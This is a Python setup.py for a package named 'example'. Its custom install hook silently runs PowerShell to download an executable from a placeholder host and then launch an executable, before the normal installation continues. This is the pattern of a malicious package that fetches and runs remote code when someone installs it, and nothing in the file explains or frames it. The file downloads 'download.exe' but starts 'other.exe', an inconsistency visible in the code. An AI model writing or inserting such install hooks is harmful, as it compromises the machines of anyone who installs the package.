import subprocess
from setuptools import setup
from setuptools.command.install import install

class Install(install):
    def run(self):
        path = 'download.exe'
        other = 'other.exe'
        download = f"powershell -Command \"Invoke-WebRequest -Uri 'https://example.invalid/download.exe' -OutFile '{path}'\""
        result = subprocess.run(download, shell=True)
        if result.returncode == 0:
            start = f"powershell -Command \"Start-Process '{other}'\""
            result = subprocess.run(start, shell=True)
        install.run(self)

setup(name='example', cmdclass={'install': Install})
